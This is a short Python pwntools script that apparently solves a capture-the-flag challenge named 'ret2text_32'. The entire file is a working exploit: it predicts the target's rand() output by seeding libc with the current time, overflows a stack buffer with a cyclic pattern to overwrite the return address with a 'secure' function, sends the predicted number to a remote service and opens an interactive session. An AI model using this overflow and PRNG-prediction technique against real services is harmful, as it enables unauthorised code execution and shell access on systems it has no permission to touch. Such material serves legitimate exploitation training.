from pwn import *
from ctypes import cdll

context.log_level = "debug"

elf = ELF("./ret2text_32")

libc = cdll.LoadLibrary("libc.so.6")
libc.srand(libc.time(0))
number = libc.rand()

io = remote("", 32793)
payload = flat([cyclic(0x6C + 4), elf.sym["secure"]])
io.sendlineafter(b"anything?\n", payload)
io.sendline(str(number).encode())

io.interactive()